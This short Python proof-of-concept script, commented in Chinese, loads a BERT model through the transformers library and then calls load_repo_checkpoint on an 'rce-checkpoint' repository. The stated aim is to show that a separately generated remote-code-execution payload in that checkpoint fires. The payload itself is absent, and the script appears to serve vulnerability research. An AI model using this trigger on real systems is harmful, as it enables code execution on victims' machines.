########################################################################################################################
#
#
# 此poc文件用于证明生成的payload确实可以被触发
#
#
########################################################################################################################

from tensorflow.keras.optimizers import Adam
from transformers import TFAutoModel

# 这个模型还是有些大的，下载可能会花一些时间...
# https://huggingface.co/google-bert/bert-base-uncased/tree/main
model = TFAutoModel.from_pretrained('bert-base-uncased')
model.compile(optimizer=Adam(learning_rate=5e-5), loss='sparse_categorical_crossentropy', metrics=['accuracy'])

# 把参数修改为checkpoint所在的仓库的路径
model.load_repo_checkpoint('rce-checkpoint')
